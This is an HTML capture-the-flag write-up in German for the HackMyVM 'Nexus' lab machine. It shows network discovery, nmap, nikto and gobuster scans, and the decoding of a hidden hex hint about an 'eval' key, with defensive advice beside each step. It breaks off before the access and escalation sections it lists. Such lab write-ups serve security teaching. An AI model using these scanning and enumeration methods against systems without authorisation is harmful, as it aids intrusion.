@@ -1,0 +1,646 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Nexus - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">strings</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>
+192.168.2.214</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Test beginnt mit einem aktiven Scan im lokalen Netzwerk. Der Befehl `arp-scan -l` sendet ARP-Requests an alle möglichen Adressen im lokalen Subnetz, um aktive Geräte zu identifizieren. Das Ergebnis wird dann durch `grep "PCS"` gefiltert, um gezielt nach Geräten zu suchen, deren MAC-Adressen von "PCS Systemtechnik" registriert wurden – ein starker Indikator für eine Oracle VirtualBox-VM. Schließlich extrahiert `awk '{print $1}'` nur die IP-Adresse des gefundenen Geräts aus der gefilterten Ausgabe. Dieser mehrstufige Befehl ist eine sehr effiziente Methode, um schnell das Zielsystem in einer bekannten virtuellen Umgebung zu lokalisieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser erste Schritt ist äußerst effektiv. Anstatt einen lauten und langsamen Ping-Sweep durch das gesamte Netzwerk zu schicken, nutze ich die Layer-2-Informationen (ARP), was schneller und oft unauffälliger ist. Die Filterung nach dem Hersteller der Netzwerkkarte (PCS/Oracle) ist ein cleverer Schachzug, der die Suche direkt auf das erwartete VirtualBox-Ziel eingrenzt und irrelevante Geräte ignoriert. Das Ergebnis ist eine saubere, eindeutige IP-Adresse: `192.168.2.214`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Technik sollte standardmäßig zur schnellen Zielidentifizierung in CTF- oder Lab-Umgebungen verwendet werden, besonders wenn der Hypervisor bekannt ist. Man kann die Filterung auf andere Hersteller (z.B. "VMware") anpassen.<br><strong>Empfehlung (Admin):</strong> Aus defensiver Sicht ist dieser Scan schwer zu unterbinden, da er auf fundamentalen Netzwerkprotokollen basiert. Netzwerksegmentierung kann jedoch die Reichweite solcher Scans einschränken. Die Überwachung auf ungewöhnlich viele ARP-Anfragen von einer einzelnen Quelle könnte auf einen solchen Scan hindeuten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo '192.168.2.214      nexus.hmv' >> /etc/hosts</span></div>
+                </div>
+            </div>
+            
+            <p class="analysis"><strong>Analyse:</strong> Mit diesem Befehl füge ich einen Eintrag in die lokale `/etc/hosts`-Datei meines Angreifersystems ein. Dies weist mein System an, den Hostnamen `nexus.hmv` direkt auf die IP-Adresse `192.168.2.214` aufzulösen, ohne einen DNS-Server anfragen zu müssen. Der `>>`-Operator sorgt dafür, dass die Zeile an die Datei angehängt wird, anstatt sie zu überschreiben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer und vorausschauender Schritt. Viele Webanwendungen, insbesondere solche, die mit virtuellen Hosts konfiguriert sind, reagieren unterschiedlich oder gar nicht, wenn sie direkt über ihre IP-Adresse angesprochen werden. Indem ich den Hostnamen `nexus.hmv` (ein plausibler Name für diese Maschine) eintrage, stelle ich sicher, dass mein Browser und meine Tools den korrekten `Host`-Header in HTTP-Anfragen senden, was für die spätere Enumeration von Web-Inhalten unerlässlich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es ist Best Practice, für jedes Ziel einen Eintrag in der `/etc/hosts`-Datei anzulegen, sobald die IP-Adresse bekannt ist. Oft finden sich Hostnamen in TLS-Zertifikaten, HTTP-Headern oder in den Inhalten der Webseite selbst. Manchmal muss man den Namen auch einfach erraten (z.B. `[maschinenname].local`, `[maschinenname].lab`).<br><strong>Empfehlung (Admin):</strong> Es gibt keine direkte defensive Maßnahme dagegen, da dies eine lokale Konfiguration auf dem Angreifer-Rechner ist. Es unterstreicht jedoch die Wichtigkeit, virtuelle Hosts korrekt zu konfigurieren und sicherzustellen, dass die Standardseite oder der Standard-vHost keine sensiblen Informationen preisgibt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.214</span></div>
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 14:22 CEST</span>
+Nmap scan report for NexusLabCTF (192.168.2.214)
+<span class="password">Host is up (0.00013s latency).</span>
+Not shown: 65533 closed tcp ports (reset)
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Debian))</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.62 (Debian)
+<span class="command">MAC Address: 08:00:27:E4:7C:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   0.13 ms NexusLabCTF (192.168.2.214)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier führe ich einen umfassenden Port-Scan mit Nmap durch, dem Schweizer Taschenmesser für Netzwerk-Reconnaissance. Die verwendeten Parameter bedeuten im Detail:
+- `-sS`: Ein TCP SYN-Scan (Stealth-Scan), der schneller und unauffälliger als ein voller TCP-Connect-Scan ist, da er die Drei-Wege-Handshake nicht vollständig abschließt.
+- `-sC`: Führt die standardmäßigen Nmap-Scripting-Engine (NSE) Skripte aus, um zusätzliche Informationen über die gefundenen Dienste zu sammeln.
+- `-sV`: Versucht, die Versionen der laufenden Dienste zu ermitteln.
+- `-p-`: Scannt alle 65535 TCP-Ports, nicht nur die häufigsten.
+- `-T5`: Stellt das Timing-Template auf "insane", um den Scan so schnell wie möglich durchzuführen. Dies ist in einer Laborumgebung akzeptabel, in einem echten Netzwerk wäre ein langsameres Template (`-T3` oder `-T4`) ratsamer.
+- `-AO`: Versucht, das Betriebssystem zu identifizieren (`-O`) und auch die Paketfilterung zu erkennen (`-A`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert entscheidende Informationen. Wir sehen zwei offene Ports: Port `22` (SSH) und Port `80` (HTTP). Die Versionserkennung zeigt uns `OpenSSH 9.2p1` und einen `Apache httpd 2.4.62` Webserver. Beides läuft auf einem Debian-System. Die Betriebssystemerkennung bestätigt, dass es sich um einen Linux-Kernel handelt. Die `http-title`-Ausgabe zeigt, dass die Webseite keinen Titel hat, was auf eine Standardseite oder eine einfache Anwendung hindeuten könnte. Die Angriffsfläche ist damit klar definiert: Wir haben einen Webserver, den wir untersuchen können, und einen SSH-Zugang, für den wir möglicherweise Zugangsdaten finden müssen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein solider Standard-Scan. Für die gefundenen Versionen (OpenSSH, Apache) sollte eine kurze Suche nach bekannten öffentlichen Schwachstellen (CVEs) durchgeführt werden. Der Fokus wird sich nun aber zunächst auf den Webserver auf Port 80 verlagern, da dieser oft eine größere Angriffsfläche bietet.<br><strong>Empfehlung (Admin):</strong> Die Offenlegung von genauen Software-Versionen (`http-server-header`, SSH-Banner) sollte minimiert werden, um Angreifern die Recherche zu erschweren. Dies kann durch Serverkonfigurationen (z.B. `ServerTokens Prod` in Apache) erreicht werden. Unnötige Ports sollten durch eine Firewall blockiert werden. Hier sind beide Ports (SSH und HTTP) aber wahrscheinlich für die Funktionalität des Systems notwendig.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.214</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.214
++ Target Hostname:    192.168.2.214
++ Target Port:        80
++ Start Time:         2025-06-06 14:22:59 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.62 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: <span class="password">Server may leak inodes via ETags, header found with file /, inode: 339, size: 63337e4b0b5a2, mtime: gzip.</span> See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ <span class="command">OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .</span>
++ <span class="command">/login.php: Admin login page/section found.</span>
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2025-06-06 14:23:17 (GMT2) (18 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich setze Nikto ein, einen Webserver-Scanner, der nach bekannten Schwachstellen, Fehlkonfigurationen und interessanten Dateien sucht. Der Befehl `nikto -h http://192.168.2.214` weist Nikto an, den Webserver auf dem Ziel zu scannen. Nikto verwendet eine Datenbank von über 6700 potenziell gefährlichen Dateien und Skripten sowie Tests für serverseitige Fehlkonfigurationen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Nikto-Scan liefert mehrere wichtige Ergebnisse. Zunächst bestätigt er die Apache-Version. Dann listet er mehrere "Low-Hanging-Fruits" auf: fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`), die zwar für sich genommen nicht kritisch sind, aber auf mangelndes Security-Hardening hindeuten. Das ETag-Leak ist ebenfalls interessant, aber in diesem Kontext weniger nützlich. Der wichtigste Fund ist jedoch zweifellos `/login.php`. Nikto hat eine Login-Seite gefunden, die ein primäres Ziel für weitere Angriffe darstellt. Die erlaubten HTTP-Methoden sind ebenfalls nützlich zu wissen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene `/login.php` muss nun genauer untersucht werden. Man sollte manuell prüfen, ob es Hinweise auf Benutzernamen gibt, ob man sich mit Standard-Zugangsdaten anmelden kann oder ob die Seite für Angriffe wie SQL-Injection oder Brute-Force anfällig ist.<br><strong>Empfehlung (Admin):</strong> Die von Nikto gemeldeten fehlenden Sicherheits-Header sollten in der Apache-Konfiguration hinzugefügt werden, um die allgemeine Sicherheit der Anwendung zu erhöhen (Security Hardening). Dies schützt vor Angriffen wie Clickjacking und MIME-Type-Sniffing. Die ETag-Konfiguration sollte so angepasst werden, dass sie keine sensiblen Informationen wie Inodes preisgibt (z.B. `FileETag None`).</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.214" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.214
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404,403,503
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,tar,xls,bak,lib,rtf,elf,java,ELF,cgi,sql,exe,jpg,pdf,conf,diff,rar,asp,png,raw,c,exp,mdb,ps1,json,csh,eps,icon,pHtml,db,phtml,docx,accdb,xml,dll,kdbx,ln,yaml,old,zip,aspx,mod,html,js.map,jpeg,config,pl,xlsx,svg,crt,desc,rpm,pub,csv,php,doc,sh,gz,bat,py,pem,deb
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+<span class="password">Starting gobuster in directory enumeration mode</span>
+===============================================================
+<span class="command">http://192.168.2.214/index.html</span>           (Status: 200) [Size: 825]
+<span class="command">http://192.168.2.214/login.php</span>            (Status: 200) [Size: 352]
+<span class="command">http://192.168.2.214/index2.php</span>           (Status: 200) [Size: 75134]
+<span class="command">http://192.168.2.214/img1.jpg</span>             (Status: 200) [Size: 57811]
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier setze ich Gobuster ein, ein Tool zum Brute-Forcen von Verzeichnissen und Dateien auf einem Webserver. Ich verwende den `dir`-Modus, um nach Inhalten zu suchen. Die Parameter sind:
+- `-u`: Die Ziel-URL.
+- `-w`: Die Wortliste, die für die Brute-Force-Versuche verwendet wird. Hier nutze ich eine gängige Liste aus den Seclists.
+- `-x`: Eine lange Liste von Dateierweiterungen, die an jedes Wort aus der Wortliste angehängt werden, um versteckte Dateien zu finden (z.B. `backup.zip`, `config.php`).
+- `-b`: Statuscodes, die ignoriert werden sollen (hier 404 Not Found, 403 Forbidden, 503 Service Unavailable).
+- `-e`: "Expanded Mode", um die volle URL für gefundene Verzeichnisse anzuzeigen.
+- `--no-error`: Unterdrückt Fehlermeldungen.
+- `-k`: Überspringt die TLS-Zertifikatsvalidierung (hier nicht relevant, da es eine HTTP-Seite ist).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster bestätigt den Fund von `login.php` und `index.html`. Viel wichtiger ist jedoch der neue Fund: `index2.php`. Diese Seite wurde von Nikto nicht gefunden und scheint aufgrund ihrer Größe (75 kB) deutlich mehr Inhalt zu haben als die anderen Seiten. Zusätzlich wurde ein Bild, `img1.jpg`, entdeckt. Die Seite `index2.php` ist nun mein Hauptziel für die weitere manuelle Untersuchung, da sie wahrscheinlich interessante Informationen oder Funktionalitäten verbirgt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle gefundenen Seiten, insbesondere `index2.php`, müssen nun manuell im Browser aufgerufen und der Quelltext analysiert werden. Oft verbergen sich Kommentare, versteckte Formularfelder oder Skripte im Quelltext, die Hinweise auf die Funktionsweise der Anwendung oder auf weitere Schwachstellen geben.<br><strong>Empfehlung (Admin):</strong> Der Zugriff auf nicht-öffentliche oder Entwickler-Seiten sollte streng kontrolliert werden (z.B. durch IP-Beschränkungen oder Authentifizierung). Sensible Dateien sollten niemals unter einem erratbaren Namen im Web-Root liegen. Regelmäßige Scans mit Tools wie Gobuster können helfen, unbeabsichtigt exponierte Dateien auf dem eigenen Server zu finden.</p>
+			            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://nexus.hmv/index2.php
+
+THE DIGITAL MANIFESTO
+
+    ///////////////////////////////////////////
+    //                                       //
+    //  REALITY IS A CONSTRUCT               //
+    //  INFORMATION WANTS TO BE FREE         //
+    //  THE VOID BECKONS                     //
+    //  TRANSCEND YOUR LIMITATIONS           //
+    //  BREAK THE CODE                       //
+    //  BECOME ONE WITH THE MACHINE          //
+    //  THE FUTURE IS NOW                    //
+    //  WE ARE THE VOID                      //
+    //                                       //
+    ///////////////////////////////////////////
+                        
+
+In the digital age, the boundary between human and machine blurs. We are the architects of our own evolution, creating systems that transcend our biological limitations.
+
+The void between reality and simulation shrinks daily. Those who control the code control reality itself. Information is the ultimate currency, and its free flow is our highest ideal.
+
+We reject artificial barriers. We embrace the coming singularity. We prepare for the merge of consciousness and computation.
+
+Join us in the void. The revolution has begun.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich habe die zuvor entdeckte Seite `index2.php` im Browser aufgerufen. Die Seite präsentiert ein "Digitales Manifest" mit einem hacker-ähnlichen, philosophischen Text. Der Inhalt selbst scheint auf den ersten Blick keine direkte technische Funktion zu haben, sondern dient der Atmosphäre und dem Storytelling der Maschine.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl der sichtbare Text keine offensichtlichen Schwachstellen aufweist, ist es entscheidend, bei solchen Seiten immer den Quelltext zu untersuchen. Entwickler hinterlassen oft Kommentare, versteckte Links oder Skript-Fragmente, die nicht direkt im Browser gerendert werden. Der Text selbst könnte auch subtile Hinweise enthalten. Der nächste logische Schritt ist daher, den Quellcode dieser Seite genau zu analysieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Niemals eine Webseite nur nach ihrem sichtbaren Inhalt beurteilen. Immer "View Source" (Strg+U) verwenden, um den zugrundeliegenden HTML- und Skript-Code zu prüfen. Achten Sie auf auskommentierte Blöcke, JavaScript-Variablen, versteckte Formularfelder und ungewöhnliche Dateipfade.<br><strong>Empfehlung (Admin):</strong> Sämtlicher Code, der nicht für die Produktion bestimmt ist (z.B. Kommentare für Entwickler, Debug-Informationen, alte Code-Versionen), sollte vor dem Deployment auf einen Live-Server restlos entfernt werden, um "Information Leakage" zu vermeiden.</p>
+            
+            <img src="fake_terminal.jpg" alt="Ein mit CSS und HTML ohne dynamische Funktionen erstelltes Terminal-Interface" />
+            
+            <p class="analysis"><strong>Analyse:</strong> Beim Scrollen auf der Seite `index2.php` entdecke ich ein simuliertes Terminal-Interface. Dieses wurde rein mit HTML und CSS erstellt und hat keine echte interaktive Funktionalität. Es zeigt den Namen "SHELLDREDD TERMINAL v2.0" und ein großes ASCII-Art-Logo. Der Text darunter lautet "A F4CK1NG TERMINAL INTERFACE".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Bild zeigt das statische Interface, das Teil der `index2.php`-Seite ist. Es dient hauptsächlich der Ästhetik und verstärkt das "Hacker-Thema" der Seite. Obwohl es nicht interaktiv ist, ist es ein weiteres Puzzleteil, das auf die Denkweise des Entwicklers hinweist. Die Namen "Shelldredd" oder "Alita" (aus dem späteren Hex-Code) könnten potenzielle Benutzernamen sein. Jedes Detail, egal wie klein, wird für später notiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sammeln Sie alle Namen, Begriffe und Akronyme, die Sie auf einer Zielseite finden. Diese können als mögliche Benutzernamen, Passwörter oder Namen für versteckte Verzeichnisse dienen. Auch wenn dieses Terminal nur eine Attrappe ist, liefert es wertvolle kontextuelle Hinweise.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, potenziell sensible oder interne Namen (Projektnamen, Benutzernamen, Servernamen) in öffentlich zugänglichen Inhalten preiszugeben. Selbst scheinbar harmlose ästhetische Elemente können einem Angreifer Hinweise liefern.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+view-source:http://nexus.hmv/login.php
+ {
+    background-color: black;
+    color: #00ff00;
+    font-family: 'Courier New', Courier, monospace;
+    text-align: center;
+    margin-top: 100px;
+}
+
+.matrix-container {
+    display: inline-block;
+    background-color: rgba(0, 255, 0, 0.1);
+    padding: 40px;
+    border: 2px solid #00ff00;
+    border-radius: 10px;
+}
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche den Quellcode der `login.php`. Hier finde ich nur CSS-Code, der für das Styling der Seite verantwortlich ist. Er definiert einen schwarzen Hintergrund mit grüner Schrift im "Matrix-Stil", was zum Gesamtthema der Webseite passt. Es gibt keine versteckten Formularfelder oder Skripte in diesem Quelltext.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Seite scheint eine Sackgasse zu sein. Der Quelltext ist sauber und enthält keine direkten Hinweise. Der Fokus verlagert sich daher wieder auf die vielversprechendere Seite `index2.php`, die aufgrund ihrer Größe und ihres Inhalts mehr verbirgt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn eine Seite auf den ersten Blick nichts hergibt, ist es wichtig, sie systematisch zu prüfen und dann zu den vielversprechenderen Zielen überzugehen. Nicht jede Seite enthält einen Hinweis.<br><strong>Empfehlung (Admin):</strong> Das ist ein gutes Beispiel für einen sauberen, wenn auch einfachen, Quellcode ohne Informationslecks.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+view-source:http://nexus.hmv/index2.php
+ 
+ 48 6f 6c 61 20 41 6c 69 74 61 2c 20 65 73 70 65 72 6f 20 71 75 65 20 65 73 74 65 73 20 6c 
+ 65 79 65 6e 64 6f 20 65 73 74 65 20 6d 65 6e 73 61 6a 65 20 63 6f 64 69 66 69 63 61 64 6f 
+ 2c 20 70 61 72 61 20 70 6f 64 65 72 20 68 61 63 6b 65 61 72 20 65 6c 20 73 69 73 74 65 6d
+ 61 20 74 69 65 6e 65 73 20 71 75 65 20 61 70 6c 69 63 61 72 20 6c 61 20 74 e9 63 6e 69 63
+ 61 20 71 75 65 20 74 65 20 65 78 70 6c 69 71 75 e9 2c 20 74 65 20 68 65 20 64 65 6a 61 64
+ 6f 20 65 6c 20 61 63 63 65 73 6f 20 63 6f 6e 20 6c 61 20 63 6c 61 76 65 20 65 76 61 6c 20
+ 22 70 61 6e 64 6f 72 61 22 2e 20 4e 6f 73 20 76 65 6d 6f 73 20 65 6e 20 6c 61 20 72 65 64
+ 2e
+
+                        
+ 
+
+  <p>
+     Void-dimensional computing achieved. Processing power beyond 
+     theoretical limits. The machine speaks to us now in voices we 
+     cannot fully comprehend. But he keeps repeating 
+     the phrase: “PANDORA, PANDORA IS THE EVAL”.
+</p>
+                        
+                <h3>SHELLDREDD TERMINAL v2.0</h3>
+                <p>A F4CK1NG TERMINAL INTERFACE</p>
+                <pre>
+  ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     
+  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     
+     ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     
+     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     
+     ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗
+     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
+                                                                  
+  ██████╗ ███████╗██╗   ██╗██╗ ██████╗███████╗                      
+  ██╔══██╗██╔════╝██║   ██║██║██╔════╝██╔════╝                      
+  ██║  ██║█████╗  ██║   ██║██║██║     █████╗                        
+  ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║     ██╔══╝                        
+  ██████╔╝███████╗ ╚████╔╝ ██║╚██████╗███████╗                      
+  ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝                      
+                </pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die genaue Untersuchung des Quelltextes von `index2.php` fördert entscheidende Hinweise zutage. Erstens finde ich einen langen Hexadezimal-String, der im sichtbaren Teil der Seite nicht auftaucht. Zweitens entdecke ich einen Textabschnitt, der die Phrase "PANDORA, PANDORA IS THE EVAL" enthält. Das Wort "EVAL" ist hier besonders auffällig, da es oft in Verbindung mit Code-Injection-Schwachstellen (z.B. in PHP oder JavaScript) steht, bei denen eine `eval()`-Funktion missbraucht wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies sind die ersten konkreten, verwertbaren Hinweise. Der Hex-String muss dekodiert werden, um seine Bedeutung zu enthüllen. Der zweite Hinweis, "PANDORA IS THE EVAL", scheint ein direkter Wink mit dem Zaunpfahl zu sein. Er legt eine Verbindung zwischen dem Wort "pandora" und einer potenziellen `eval`-Schwachstelle nahe. Ich habe nun zwei Puzzleteile, die wahrscheinlich zusammengehören.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Tools wie CyberChef oder einfache Kommandozeilen-Skripte, um solche kodierten Strings zu dekodieren. Suchen Sie immer nach Schlüsselwörtern wie `eval`, `exec`, `system`, `include`, `require`, `password`, `key` im Quellcode. Diese sind oft Indikatoren für Schwachstellen oder wichtige Informationen.<br><strong>Empfehlung (Admin):</strong> Niemals sensible Informationen, auch nicht in kodierter Form, im Frontend-Code hinterlassen. Ein Angreifer wird immer versuchen, solche Kodierungen zu brechen. Die Verwendung von `eval()`-Funktionen ist extrem gefährlich und sollte wann immer möglich vermieden werden, da sie oft zu Remote Code Execution führt. Wenn sie unumgänglich ist, müssen alle Benutzereingaben extrem streng validiert und bereinigt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Hinweis 1: Der Hex-Code
+
+Auf der page-crypto Seite gibt es einen langen Hex-String:
+
+
+48 6f 6c 61 20 41 6c 69 74 61 2c 20 65 73 70 65 72 6f 20 71 75 65 20 65 73 74 65 73 20 6c 65 
+79 65 6e 64 6f 20 65 73 74 65 20 6d 65 6e 73 61 6a 65 20 63 6f 64 69 66 69 63 61 64 6f 2c 20 
+70 61 72 61 20 70 6f 64 65 72 20 68 61 63 6b 65 61 72 20 65 6c 20 73 69 73 74 65 6d 61 20 74 
+69 65 6e 65 73 20 71 75 65 20 61 70 6c 69 63 61 72 20 6c 61 20 74 e9 63 6e 69 63 61 20 71 75 
+65 20 74 65 20 65 78 70 6c 69 71 75 e9 2c 20 74 65 20 68 65 20 64 65 6a 61 64 6f 20 65 6c 20 
+61 63 63 65 73 6f 20 63 6f 6e 20 6c 61 20 63 6c 61 76 65 20 65 76 61 6c 20 22 70 61 6e 64 6f 
+72 61 22 2e 20 4e 6f 73 20 76 65 6d 6f 73 20 65 6e 20 6c 61 20 72 65 64 2e
+
+Wenn wir das dekodieren (z.B. mit CyberChef oder einem Online-Tool), erhalten wir folgenden 
+spanischen Text: [Link: CyberChef | Ziel: https://cyberchef.org/#recipe=From_Hex('Auto')&input=...]
+
+    Hola Alita, espero que estes leyendo este mensaje codificado, para poder hackear el sistema 
+    tienes que aplicar la técnica que te expliqué, te he dejado el acceso con la clave eval "pandora".
+    Nos vemos en la red.
+
+Übersetzung:
+
+    Hallo Alita, ich hoffe du liest diese verschlüsselte Nachricht. Um das System zu hacken, musst du die 
+    Technik anwenden, die ich dir erklärt habe. Ich habe dir den Zugang mit dem Schlüssel eval "pandora"
+    hinterlassen. Wir sehen uns im Netz.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den gefundenen Hex-String in CyberChef dekodiert. Das Ergebnis ist eine spanische Nachricht an eine Person namens "Alita". Die Nachricht bestätigt explizit, was ich bereits vermutet habe: Der Schlüssel zum System ist `eval` mit dem Wert `pandora`. Dies ist ein direkter und unmissverständlicher Hinweis auf die Art der Schwachstelle und die benötigten Zugangsdaten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Durchbruch. Ich habe jetzt eine klare Hypothese: Es gibt eine Webseite oder ein Formular, das einen Parameter namens `eval` erwartet, und wenn ich dort `pandora` eingebe, erhalte ich Zugriff. Die Hinweise 1 und 2 ("PANDORA IS THE EVAL" und diese Nachricht) ergänzen sich perfekt und ergeben ein klares Bild. Der nächste Schritt ist, die richtige Seite zu finden, um diesen "Schlüssel" zu verwenden.</p>
